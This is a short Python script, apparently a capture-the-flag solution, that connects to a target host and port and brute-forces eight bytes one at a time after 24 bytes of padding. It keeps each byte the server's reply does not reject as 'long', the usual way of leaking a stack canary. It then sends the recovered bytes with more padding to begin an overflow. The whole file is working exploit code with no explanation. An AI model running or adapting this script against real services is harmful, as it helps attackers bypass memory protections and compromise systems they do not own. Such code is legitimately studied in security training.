import sys, socket, time

host = sys.argv[1]
port = int(sys.argv[2])

msg = bytes("a"*24,'ascii')
for x in range(8):
    for c in range(256):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(msg+bytes([c]))
        time.sleep(0.1)
        s1 = s.recv(1024).decode()
        print(s1)
        if(not 'long' in s1):
            print(bytes([c]))
            msg += bytes([c])
            break

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(msg+bytes("a"*4,'ascii'))
time.sleep(0.1)
print(s.recv(1024).decode())
